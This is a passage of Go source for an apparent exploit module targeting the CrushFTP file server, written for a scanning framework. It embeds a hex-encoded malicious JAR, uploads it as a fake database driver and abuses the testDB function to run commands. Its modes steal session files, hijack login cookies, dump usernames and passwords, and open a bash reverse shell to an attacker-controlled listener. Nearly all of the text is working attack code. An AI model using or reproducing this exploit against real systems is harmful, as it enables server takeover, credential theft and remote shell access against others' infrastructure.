4fa48a08b2b1f1ea919fb4d2ccc692ad26947275c74d6d36656d0da4582d18d185a574956c4405c1cb7572762fb69f94d1298b4e49a359ae94dd7a226d6cd82e6b7e6753c9e7405d21eb58163d8f039ec9136fd1de946bd0c90ad7eeb2f7184e872efb89caceefeaa6c5e0cc2894d631a03b3186cdb0e28617a2a09e4c1a16bb58db6bead0b99b2d1bb56b8f5de02927d53f069719cc7f4c9d9080dc3665343696886c5389fe293089f22660af6e4ce6491d6f5a63c903193f8dc5788d9130074d57a6ab64b24b3e0794013dd56d0c31f47ecb9ba43d6b65a51db347e9e35d75ecbda7955ae4946c4913afceb402af8a1ab46aa63a1276ca60aeca49612672cfbfec6b28b0c7a14ffc6cf49e0d81ed8974ca8375c2309272fb42ef35610c99ee2609401ec5a5b46ca6d6d31ebddff05e24c9841ee76acd2961734a38957ccf9956562166f3b91ce31f1c1b7129479fec4f7c69fb6457e25cc94ec866caf1727e45203b2310683e0cf1a047f6468e416f7312de04d93d3d02bc19577016d0b18d5492b987bb659cc347e1eb6d6e0d9765e0cf207018c1634592aa3d490d59ea9c24b98ad334e1adfa6090633bd77eeef4f3970d3c6ba450c8e7e749aae5296861a52503f50082e1f211ae425d2de18a0cb403686f6e398ccaf0a40c26af6f7d2c701729aa469a5bcb961cc294e656ff9223081f41f521d41cc5d45eba5bdbdd96415d78da484bb8de1350d9ec49c860fac8f88a6acb3c47966332c75ac6af0e55a8e79f2dd3310b33d1843318c5595842f7ce65ecd7f1cfac0d98cb0ccc63e4e7d3d90574a4d10b4033dd68421b7660279ddd0005090c7a4149e5839282e505c5f61210a8f49dc06c05c9973037ccdd5d6341f13d4f59e50ccec2f08c239899c119ebbd6888eed6f0ac0cce3c80952de1066fd1d0129ecdc541d41dc59cdec3984bc279e1f91c3258d0157c140b7bcbc28db15e7fb829d61b688945fdc338fff4cccd13995b24736b8ef908daea098345dd4711e96588171fc659e125199c1d0dd40732587a0015727edd300261251acc512d1ba7ca29aa0f52c9c91c59cdd1607d30aab43d0585bce7d42b2359e1e74683f9bde04854cd7fa8c718aefd7c6906f907a69ca7337441beb0e43c5dcc94732ed13b20d7ad0c6e1b13b088c95ecc749f8516a678059632a9cb88cd737025d3bd1fe7e100ff6ebd8ff038c6d367b1122f62155ec65a8c621d9f94aba871b550d1212663ada8e65e1dd7d3b96e205424282ea7a618753b04859f92b612022e6fd6315c8034a110247718bbb1877b4cf71850b81af280522e66612f573e5451f65bf056cada8fdb72f2248c8ea2f215ac5070a582ab6ae79f4035f17402cd0adeb68a9ba384afa2e0eddeb924e1298fb89637ef1da354718a631f8f397b0229c68740119d14f0ce5750c5f13414fb461981f2e203f076ecf30a0e5f6939cc9f4d8734ee1d1fc3bc07f583280f47bb8779dfdbbb093ee6fbbca8ff28ceef6d997918cb090ca2713101c36959549130591155e5d7ca68b9fc5a150dc969f5415c2131d77127aaea4372b52683b5c3a32fd42bf94d657c53cd6d96cbd5d866288375f5e51c6a70c111744a25176e1e861aad181ebd537e9d23355d348c72597cba363fc8900ce3018c109560c61fe79c45a185191cbb89be0d2c3a1713813116968dc4e4a5584d0cf630e35bf8ef0a16f5416226cd00ed239eae273e6e638dbe9d55fa6ed6d761d6d50758574758531f226e0f11df8f1019c7a8e171969f27c8fd34512291780d8b5b35f5bf8bb2cba8f1dedc6a0eeec0bb892b3fb5df44745e4b242ec57bf11e5cc7fade4ebeebb95268d755dcbd0e2a3a89d71bf03ee6b587b2dfcf55889a021e8a65b93b9e2f77c7bdf624bcd5167c80f19088bd1015b52724be089a65a8c862438c8163bf821bc7fedfc4ff844a4d4dcd16a2cc3f4a7c94e5c83df40528f1e6b1a2898ba8ddc7b98e4d439692f5e1faecd4ed4d23456dcbf1c2529b65c99b5c97abd0021fc42db956b88c5f92ca57767f918ca10219bebc0c5faef51536bc5b99b8acb40e7ec93005ca1ec58662a3ae2ae8a581bcc040be97064af4d20fb14a6523d09a6bf8271bbaafa0dbfbf2ddfee06be0bcb624e78789c1ffc7794349ce3b70672e10794e511c851b4b708e797c177f3f927fe22c67a424555573f3c37c093c8c9a0c7a32b878fcb513f292732b1bfc6d0552abf2f6dced517ef47f504b0708f62866ce3a0b0000e4150000504b03040a00000800006d997c57000000000000000000000000090000004d4554412d494e462f504b010214001400080808006d997c5764a925cc37000000360000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01020a000a00000800006d997c5700000000000000000000000004000000000000000000000000007d0000006f72672f504b01020a000a00000800006d997c5700000000000000000000000009000000000000000000000000009f0000006f72672f746573742f504b010214001400080808006d997c57f62866ce3a0b0000e41500001500000000000000000000000000c60000006f72672f746573742f4472697665722e636c617373504b01020a000a00000800006d997c570000000000000000000000000900000000000000000000000000430c00004d4554412d494e462f504b05060000000005000500290100006a0c00000000")
		postFileRequestConfig := httpclient.NewPostRequestConfig("/U/" + uploadId + "~1~3497")
		postFileRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		postFileRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		postFileRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		postFileRequestConfig.Header.Store("Cookie", cookie)
		postFileRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryh1ssuGrrOsd5GlVE")
		postFileRequestConfig.Data = "------WebKitFormBoundaryh1ssuGrrOsd5GlVE\r\nContent-Disposition: form-data; name=\"CFCD\"; filename=\"" + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + string(fileContent) + "\r\n------WebKitFormBoundaryh1ssuGrrOsd5GlVE--\r\n"
		fileUploadResponse, err := httpclient.DoHttpRequest(hostInfo, postFileRequestConfig)
		if err != nil || fileUploadResponse.StatusCode != 200 {
			return false, err
		}
		postFormCloseRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/")
		postFormCloseRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		postFormCloseRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		postFormCloseRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		postFormCloseRequestConfig.Header.Store("Cookie", cookie)
		postFormCloseRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryh1ssuGrrOsd5GlVE")
		postFormCloseRequestConfig.Data = "------WebKitFormBoundaryh1ssuGrrOsd5GlVE\r\nContent-Disposition: form-data; name=\"command\"\r\n\r\ncloseFile\r\n------WebKitFormBoundaryh1ssuGrrOsd5GlVE\r\nContent-Disposition: form-data; name=\"upload_id\"\r\n\r\n" + uploadId + "\r\n------WebKitFormBoundaryh1ssuGrrOsd5GlVE\r\nContent-Disposition: form-data; name=\"total_chunks\"\r\n\r\n1\r\n------WebKitFormBoundaryh1ssuGrrOsd5GlVE\r\nContent-Disposition: form-data; name=\"total_bytes\"\r\n\r\n3497\r\n------WebKitFormBoundaryh1ssuGrrOsd5GlVE\r\nContent-Disposition: form-data; name=\"filePath\"\r\n\r\n" + filename + "\r\n------WebKitFormBoundaryh1ssuGrrOsd5GlVE\r\nContent-Disposition: form-data; name=\"lastModified\"\r\n\r\n1701169886869\r\n------WebKitFormBoundaryh1ssuGrrOsd5GlVE\r\nContent-Disposition: form-data; name=\"c2f\"\r\n\r\n" + c2f + "\r\n------WebKitFormBoundaryh1ssuGrrOsd5GlVE--\r\n"
		formCloseResponse, err := httpclient.DoHttpRequest(hostInfo, postFormCloseRequestConfig)
		return err == nil && formCloseResponse != nil && formCloseResponse.StatusCode == 200, err
	}

	// 执行 jar 包命令获取执行结果，通过 user 参数进行命令传递
	executeCommandPXOIWEBNSASP := func(hostInfo *httpclient.FixUrl, platform, filename, cookie, cmd, c2f string) (bool, string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/")
		postRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		postRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		postRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		postRequestConfig.Header.Store("Cookie", cookie)
		driverPath := "%252Ftmp%252F"
		if platform == "win" {
			driverPath = "C%253A%252F"
		}
		postRequestConfig.Data = `c2f=` + c2f + `&command=testDB&db_driver_file=` + driverPath + filename + `&db_driver=org.test.Driver&db_url=jdbc%253Amysql%253A%252F%252F127.0.0.1%253A3306%252Fcrushftp%253FautoReconnect%253Dtrue&db_user=` + url.QueryEscape(cmd) + `&db_pass=`
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err == nil && resp != nil && strings.Contains(resp.Utf8Html, "<commandResult><response>") && strings.Contains(resp.Utf8Html, `Error:java.lang.RuntimeException`) {
			commandResults := regexp.MustCompile(`<commandResult><response>Error:java.lang.RuntimeException%3A([\s\S]*?)</response></commandResult>`).FindStringSubmatch(resp.RawBody)
			result, err := url.QueryUnescape(commandResults[1])
			if len(commandResults) > 1 && err == nil {
				return true, result, nil
			}
		}
		return false, "", err
	}

	// 执行命令
	execFlagXOPAUIEDWIOQJDP := func(hostInfo *httpclient.FixUrl, cmd string) (string, error) {
		cookie, err := getLoginCookieFlagMOICASJEIOD(hostInfo)
		if err != nil {
			return "", err
		}
		c2f, err := splitCookieFlagCOISUAD(cookie)
		if err != nil {
			return "", err
		}
		os, err := checkSystemPlatformOCIQWUJDEOIASJD(hostInfo, cookie, c2f)
		if err != nil {
			return "", err
		}
		filename := "CrushFTPSqlDriverJar.jar"
		// 执行命令
		if success, result, err := executeCommandPXOIWEBNSASP(hostInfo, os, filename, cookie, cmd, c2f); success {
			return result, nil
		} else if err != nil {
			return "", err
		}
		// 上传文件
		if success, err := uploadSqlDriverJarFileCOPIAJSEDWQE(hostInfo, os, filename, cookie, c2f); err != nil {
			return "", err
		} else if !success {
			return "", errors.New("漏洞利用失败")
		}
		// 执行命令
		if success, result, err := executeCommandPXOIWEBNSASP(hostInfo, os, filename, cookie, cmd, c2f); success {
			return result, nil
		} else if err != nil {
			return "", err
		}
		return "", errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			responseBody, err := getSessionsObjFileDKPSOAIDCMOPAS(hostInfo)
			return err == nil && len(responseBody) > 0
		}, func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sessions.obj" {
				if sessionsObj, err := getSessionsObjFileDKPSOAIDCMOPAS(expResult.HostInfo); len(sessionsObj) > 0 {
					expResult.Output = sessionsObj
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "login" {
				if cookie, err := getLoginCookieFlagMOICASJEIOD(expResult.HostInfo); len(cookie) > 1 {
					expResult.Success = true
					expResult.Output = `Cookie: ` + cookie
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "password" {
				if cookie, err := getLoginCookieFlagMOICASJEIOD(expResult.HostInfo); len(cookie) > 1 {
					if username, password, err := getUserPasswordMOICASJEIODJ(expResult.HostInfo, cookie); len(username) > 0 && len(password) > 0 {
						expResult.Success = true
						expResult.Output = "username: " + username + "\n" + "password: " + password
					} else if err != nil {
						expResult.Output = err.Error()
					} else {
						expResult.Output = `漏洞利用失败`
					}
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "cmd" {
				if result, err := execFlagXOPAUIEDWIOQJDP(expResult.HostInfo, goutils.B2S(ss.Params["cmd"])); err == nil {
					expResult.Output = result
					expResult.Success = true
				} else {
					expResult.Output = err.Error()
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					expResult.Output = err.Error()
				} else {
					cmd := "#####" + godclient.GetGodServerHost() + ":" + rp
					//ReverseTCPByBash返回的是bash -i >& /dev/tcp/godserver/reverseport 也就是rp
					go execFlagXOPAUIEDWIOQJDP(expResult.HostInfo, cmd)
					//检测为固定格式
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
					}
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
